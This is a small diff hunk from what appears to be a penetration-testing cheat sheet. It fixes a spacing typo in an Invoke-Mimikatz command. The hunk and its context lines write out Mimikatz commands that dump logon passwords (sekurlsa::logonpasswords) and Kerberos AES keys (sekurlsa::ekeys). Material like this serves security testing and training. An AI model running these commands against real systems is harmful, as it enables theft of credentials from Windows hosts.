@@ -21,7 +21,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
 
 AES cred
 ```powershell
-Invoke-Mimikatz-Command '"sekurlsa::ekeys"'
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
 Credential Vault
